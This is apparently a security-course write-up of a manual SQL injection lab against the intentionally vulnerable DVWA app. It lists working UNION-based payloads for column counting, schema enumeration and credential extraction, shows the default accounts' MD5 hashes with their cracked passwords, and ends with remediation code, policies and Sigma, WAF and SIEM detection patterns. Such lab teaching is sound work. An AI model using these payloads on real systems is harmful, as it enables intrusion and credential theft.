# Write-Up: Manual SQL Injection — Full Database Extraction

---

## 1. VULNERABILITY: Unsanitized String Concatenation in SQL Query

### Root Cause

The application constructs the backend SQL query by directly appending the user-supplied `id` parameter into the query string:

```sql
-- Server-side query (inferred from behavior)
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

The variable `$id` is inserted verbatim with no escaping, no type enforcement, and no parameterized binding. Any character the user submits — including SQL syntax characters like single quotes — is passed directly to the database engine.

### Proof of Injection Point

**Payload:** `'`

**Server Error Response:**
```
You have an error in your SQL syntax; check the manual that corresponds
to your MariaDB server version for the right syntax to use near
''''' at line 1
```

**Error Analysis:**
```
Query becomes: SELECT first_name, last_name FROM users WHERE user_id = '''
                                                                         ^^^
Three single quotes: developer's opening ' + attacker's ' + developer's closing '
= Broken string pairing → Database throws syntax error → Injection confirmed
```

### Vulnerability Classification

| Property | Value |
| :--- | :--- |
| **Type** | SQL Injection |
| **Subtype** | UNION-Based In-Band + Error-Based |
| **CWE** | CWE-89: Improper Neutralization of Special Elements in SQL Command |
| **OWASP** | A03:2021 — Injection |
| **CVSS Base Score** | 8.8 High (PR:L — application login required) |
| **Attack Vector** | Network |
| **Privileges Required** | Low (standard application account, not admin) |
| **Database** | MariaDB / MySQL (confirmed from error message syntax) |

*Note: Unauthenticated SQLi (PR:N) scores 9.8 Critical. This specific finding requires a valid application login first, making it PR:L → 8.8 High. Both are severe and require immediate remediation.*

---

## 2. EXPLOITATION: Systematic Manual Database Extraction

### Phase 1: Confirm Injection and Column Count

**Step 1: Trigger injection**
```sql
Payload: '
Result:  SQL syntax error → injection confirmed
```

**Step 2: Enumerate column count via ORDER BY**
```sql
Payload: 1' ORDER BY 2 -- -
Result:  Normal response → 2+ columns exist

Payload: 1' ORDER BY 3 -- -
Result:  Error: Unknown column '3' in 'order clause'
Conclusion: SELECT returns exactly 2 columns
```

**Why ORDER BY works:**
```sql
-- Full query with payload:
SELECT first_name, last_name FROM users WHERE user_id = '1' ORDER BY 3 -- -'

-- ORDER BY 3 references a 3rd column that doesn't exist
-- Database throws error → we know column count is 2
```

---

### Phase 2: Identify Writable Column Positions

```sql
Payload: 1' UNION SELECT 1, 2 -- -
Result:  Page displays "1" and "2" in output fields

Conclusion:
  Column position 1 → maps to first_name field on page
  Column position 2 → maps to last_name field on page
  Both columns accept string output → ready for data extraction
```

---

### Phase 3: Database Reconnaissance

```sql
Payload: 1' UNION SELECT database(), user() -- -

Results:
  first_name field: dvwa           ← current database name
  last_name field:  app@localhost  ← database user running queries
```

**Intelligence gathered:**
- Database name: `dvwa`
- DB user: `app@localhost` (application-level account, not root)
- Note: Even non-root DB users can expose full application data

---

### Phase 4: Table Enumeration

```sql
Payload: 1' UNION SELECT null, table_name FROM information_schema.tables
         WHERE table_schema='dvwa' -- -

Results:
  guestbook
  users
```

**Why `information_schema`:**
- MySQL/MariaDB stores all database metadata here
- Accessible by any authenticated DB user (including app users)
- No special privileges required to read table/column names

---

### Phase 5: Column Enumeration (Target: `users` table)

```sql
Payload: 1' UNION SELECT null, column_name FROM information_schema.columns
         WHERE table_name='users' AND table_schema='dvwa' -- -

Results:
  user_id
  first_name
  last_name
  user
  password
  avatar
  last_login
  failed_login
```

**High-value columns identified:**
- `user` → username
- `password` → password hash

---

### Phase 6: Credential Extraction

```sql
Payload: 1' UNION SELECT user, password FROM users -- -

Results:
```

| Username | Password Hash (MD5) | Cracked Password |
| :--- | :--- | :--- |
| **admin** | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| **gordonb** | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| **1337** | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
| **pablo** | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| **smithy** | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |

**Hash Identification:**
- Hash format: 32 hex characters = MD5
- MD5 is cryptographically broken (collision attacks, rainbow tables)
- All five hashes cracked instantly via online lookup (crackstation.net)

**Complete compromise achieved:** Full credential set extracted from database without any automated tools.

---

### Burp Suite Repeater Role

**Why Repeater instead of browser URL bar:**

```
Browser URL bar limitations:
  - Auto URL-encodes special characters (' → %27, space → %20)
  - May lose session cookies between requests
  - Cannot easily modify headers (User-Agent, Referer, Cookie)
  - No request history for comparison
  - Browser caching can interfere

Burp Suite Repeater advantages:
  - Sends raw HTTP exactly as written
  - Preserves all headers (Cookie, session token)
  - Maintains complete request history → compare responses side-by-side
  - Can inject into ANY parameter: URL, body, headers, cookies
  - Handles all characters natively without encoding interference
```

**Workflow:**
```
1. Intercept normal request in Proxy tab
2. Right-click → Send to Repeater
3. Modify target parameter in raw request
4. Click Send → Observe response
5. Iterate payload without recapturing request
```

---

## 3. BUSINESS IMPACT: Credential Theft and Lateral Movement

### Immediate Impact

**Database fully compromised:**
- All 5 user accounts extracted
- Password hashes cracked (MD5 = trivially weak)
- Application credentials now in attacker's possession

**Cascading Risk:**

```
Extracted credential: admin / password
         ↓
Password reuse check:
  → Same password on admin's email account? → Email compromised
  → Same password on VPN? → Internal network access
  → Same password on cloud console? → Infrastructure access
  → Same password on backup server? → Data theft at scale
```

**Financial Exposure:**

| Scenario | Probability | Estimated Cost |
|----------|------------|----------------|
| Credential reuse → internal access | 60% | $1M-$5M |
| Customer data breach via admin access | 50% | $3M-$15M |
| Ransomware deployment post-access | 40% | $500K-$10M |
| Regulatory fines (GDPR/PDPA) | 80% | $500K-$20M |
| **Expected total (probability-weighted)** | | **$2M-$8M** |

**Source:** IBM Cost of Data Breach 2023 — average SQL injection breach cost: $4.9M

### Why MD5 Amplifies Risk

```
MD5 (what DVWA uses):
  → Speed: ~10 billion hashes/second on modern GPU
  → 5 hashes cracked: <1 second
  → 1 million hashes: milliseconds
  → Pre-computed rainbow tables: instant lookup (no GPU needed)

bcrypt cost 12 (correct approach):
  → Speed: ~10,000 hashes/second on same GPU (1 million× slower)
  → 5 hashes: ~0.5 seconds (similar wall time for small sets)
  → The protection is per-attempt cost, not total time
  → Brute-forcing 1 billion candidate passwords:
       MD5:    ~0.1 seconds
       bcrypt: ~115 days on a single high-end GPU
  → Makes offline dictionary attacks economically infeasible
```

---

## 4. TECHNICAL FIX: Parameterized Queries + Secure Hashing

### Fix 1: Parameterized Queries (Eliminates SQLi)

```php
// VULNERABLE: String concatenation (current DVWA code)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($db, $query);

// SECURE: Parameterized prepared statement
$stmt = $db->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);   // "i" = integer type enforcement
$stmt->execute();
$result = $stmt->get_result();
```

**Why this works:**
- Database receives query structure and data separately
- `$id = "1' UNION SELECT user, password FROM users -- -"` becomes a literal string search
- No rows match that string as a user_id → empty result → attack neutralized

### Fix 2: Input Type Enforcement

```php
// Enforce integer type before query
$id = intval($_GET['id']);
// "1' UNION SELECT..." → intval() → 1 (string truncated at non-numeric)
// Attack eliminated before reaching database
```

### Fix 3: Replace MD5 with bcrypt

```php
// VULNERABLE: MD5 (never use for passwords)
$password_hash = md5($password);

// SECURE: bcrypt with cost factor
$password_hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Verification
if (password_verify($input_password, $stored_hash)) {
    // Login successful
}
```

**Cost factor 12:** Each verification takes ~250ms — acceptable for login, catastrophic for brute-forcing millions of hashes.

### Fix 4: Least-Privilege Database Account

```sql
-- Create restricted application user
CREATE USER 'app_user'@'localhost' IDENTIFIED BY '[strong-password]';

-- Grant ONLY what the application needs
GRANT SELECT, INSERT, UPDATE ON dvwa.guestbook TO 'app_user'@'localhost';
GRANT SELECT ON dvwa.users TO 'app_user'@'localhost';
-- Do NOT grant FILE, SUPER, or EXECUTE privileges
```

**Important caveat:** In MySQL/MariaDB, `information_schema` is a virtual system schema readable by **all** authenticated users regardless of grants. It cannot be revoked. This is a fundamental MySQL design decision.

**What least-privilege actually prevents:**
- Attacker cannot read tables in *other* databases (only `dvwa`)
- Attacker cannot use `LOAD_FILE()` or `INTO OUTFILE` (no FILE privilege)
- Attacker cannot modify schemas or drop tables (no DDL privileges)
- Table enumeration via `information_schema` is still possible — this is why parameterized queries are the mandatory first-line defense, not privilege restriction alone.

---

## 5. POLICY FIX: Organizational Controls

### Policy 1: Mandatory Prepared Statements

```
Standard: All database queries must use parameterized prepared statements
Enforcement:
  - SAST (Static Application Security Testing) scans in CI/CD pipeline
  - Automated build failure on detected string concatenation into SQL
  - Code review checklist: SQL injection check mandatory before merge
  - Developer security training: quarterly (focus on injection vulnerabilities)
```

### Policy 2: Password Storage Standard

```
Approved algorithms: bcrypt (cost ≥ 12), Argon2id, scrypt
Prohibited algorithms: MD5, SHA1, SHA256 (without salt and stretching)
Enforcement:
  - Password hashing library approved list (no custom implementations)
  - Annual audit of stored password hash formats
  - Migration plan for legacy MD5/SHA1 hashes
```

### Policy 3: Burp Suite Authorized Use

```
Burp Suite usage policy:
  - Authorized: Security team, penetration testers, bug bounty participants
  - Scope: Only against explicitly authorized targets
  - Documentation: All testing sessions logged with timestamps
  - Prohibited: Production systems without explicit written authorization
```

### Policy 4: Error Message Suppression

```
Requirement: Database errors must never reach the browser
  VULNERABLE: Displaying "MariaDB syntax error near '''"
  SECURE: Displaying "An error occurred. Please try again."

Enforcement:
  - Generic error handler catches all DB exceptions
  - Detailed errors logged server-side with request context
  - Never include stack traces or query fragments in HTTP responses
```

---

## 6. DETECTION RULE: Identifying SQLi Attack Patterns

### Sigma Rule: UNION-Based SQL Injection

```yaml
title: SQL Injection UNION SELECT Attack Pattern
description: >
  Detects HTTP requests containing UNION SELECT patterns
  indicating structured database extraction attempts
logsource:
  category: webserver
  product: any
detection:
  selection:
    - "UNION+SELECT"
    - "UNION%20SELECT"
    - "union+select"
    - "information_schema"
    - "ORDER+BY+%"
    - "%27+ORDER+BY"
    - "1=1"
    - "OR+1%3D1"
  condition: selection
falsepositives:
  - Legitimate security scanners (Burp Suite, ZAP, Nessus)
  - SQL-aware search queries (rare in legitimate apps)
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.89
```

### WAF Rule: Error-Based Injection Probe

```
Block if request parameter contains:

Pattern 1: Single quote followed by SQL structure
  Regex: '[^']*'[^']*\s*(UNION|ORDER|SELECT|FROM|WHERE)
  Match: 1' ORDER BY 3 -- -

Pattern 2: Comment sequences at end of parameter
  Regex: .*--\s*$|.*#\s*$|.*\/\*.*
  Match: 1=1 -- -

Pattern 3: information_schema access
  Literal: information_schema
  Severity: Critical (schema enumeration in progress)

Action: Block + Log + Alert SOC
```

### SIEM Alert: Systematic Enumeration Behavior

```
Alert if from single source IP within 10 minutes:
  1. Request with ' → SQL error response (5xx)
  2. Request with ORDER BY 1 → Normal response
  3. Request with ORDER BY 2 → Normal response
  4. Request with ORDER BY 3 → Error response
  5. Request with UNION SELECT → Normal response

Pattern = column enumeration sequence
Severity: Critical
Action: Block IP + Immediate SOC notification
```

---

## Summary

**What This Week Demonstrates:**

| Skill | Evidence |
|-------|---------|
| HTTP request manipulation | Burp Repeater: modify + replay raw requests |
| Error-based discovery | `'` → MariaDB error confirms injection |
| Systematic enumeration | ORDER BY → UNION → information_schema → target table |
| Credential extraction | 5 user:hash pairs extracted manually |
| Hash analysis | MD5 identified and cracked to plaintext |
| Business translation | $2M-$8M probability-weighted breach exposure |
| Layered remediation | Parameterized queries + bcrypt + least-privilege + WAF |

---

**Status:** Week 7 Complete | Manual SQL Injection Mastered | 6-Part Framework Applied

**References:**
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection
- IBM Data Breach 2023: https://www.ibm.com/reports/data-breach
- PortSwigger SQLi: https://portswigger.net/web-security/sql-injection
